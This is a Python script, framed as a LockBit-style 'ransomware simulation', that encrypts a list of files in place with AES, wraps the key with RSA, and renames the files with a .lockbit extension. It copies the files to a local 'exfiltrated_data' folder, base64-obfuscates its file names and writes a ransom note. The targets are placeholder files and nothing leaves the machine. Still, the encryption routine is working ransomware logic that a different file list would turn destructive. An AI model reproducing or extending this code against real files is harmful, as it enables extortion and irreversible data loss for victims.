import os
from base64 import b64encode, b64decode
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend

# Obfuscated strings for file names
PRIVATE_KEY_FILE = b64decode('cHJpdmF0ZV9rZXkucGVt').decode('utf-8')
PUBLIC_KEY_FILE = b64decode('cHVibGljX2tleS5wZW0=').decode('utf-8')
ENCRYPTED_AES_KEY_FILE = b64decode('ZW5jcnlwdGVkX2Flc19rZXkuYmlu').decode('utf-8')
RANSOM_NOTE_FILE = b64decode('UkFOU09NX05PVEUudHh0').decode('utf-8')
ENCRYPTED_FILE_EXTENSION = b64decode('bG9ja2JpdA==').decode('utf-8')


# Generate RSA keys
def generate_rsa_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    # Save private key
    with open(PRIVATE_KEY_FILE, "wb") as key_file:
        key_file.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

    # Save public key
    with open(PUBLIC_KEY_FILE, "wb") as key_file:
        key_file.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))

    return private_key, public_key


# Encrypt AES key with RSA
def encrypt_aes_key(aes_key, public_key):
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_aes_key


# Encrypt files with AES and rename to .lockbit
def encrypt_files(files, aes_key):
    for file in files:
        with open(file, "rb") as f:
            data = f.read()

        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()

        padded_data = padder.update(data) + padder.finalize()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        with open(file, "wb") as f:
            f.write(iv + encrypted_data)  # Prepend IV to the encrypted data

        os.rename(file, file + f'.{ENCRYPTED_FILE_EXTENSION}')


# Simulate exfiltration of data
def exfiltrate_data(files, exfiltration_dir="exfiltrated_data"):
    if not os.path.exists(exfiltration_dir):
        os.makedirs(exfiltration_dir)

    for file in files:
        with open(file, "rb") as f:
            data = f.read()
        exfiltrated_file = os.path.join(exfiltration_dir, os.path.basename(file))
        with open(exfiltrated_file, "wb") as f:
            f.write(data)
    print("Data exfiltrated to:", exfiltration_dir)


# Function to simulate ransomware behavior
def ransomware_simulation(target_files):
    # Generate and save RSA keys
    private_key, public_key = generate_rsa_keys()
    print("RSA keys generated and saved.")

    # Generate AES key
    aes_key = os.urandom(32)

    # Encrypt AES key with RSA
    encrypted_aes_key = encrypt_aes_key(aes_key, public_key)
    with open(ENCRYPTED_AES_KEY_FILE, "wb") as key_file:
        key_file.write(encrypted_aes_key)
    print("AES key encrypted with RSA and saved to 'encrypted_aes_key.bin'")

    # Exfiltrate data
    exfiltrate_data(target_files)

    # Encrypt the files
    encrypt_files(target_files, aes_key)
    print("Files encrypted and renamed with .lockbit extension:")
    for file in target_files:
        print(file + f'.{ENCRYPTED_FILE_EXTENSION}')

    # Display the ransom note
    ransom_note = """
    Your files have been encrypted!
    To decrypt your files, please obtain the decryption key.
    Contact us at: your_email@example.com
    """
    with open(RANSOM_NOTE_FILE, "w") as note_file:
        note_file.write(ransom_note)
    print("Ransom note created.")


# List of files to encrypt (for demonstration purposes)
target_files = ["file1.txt", "file2.txt", "file3.txt"]

# Simulate ransomware encryption
ransomware_simulation(target_files)
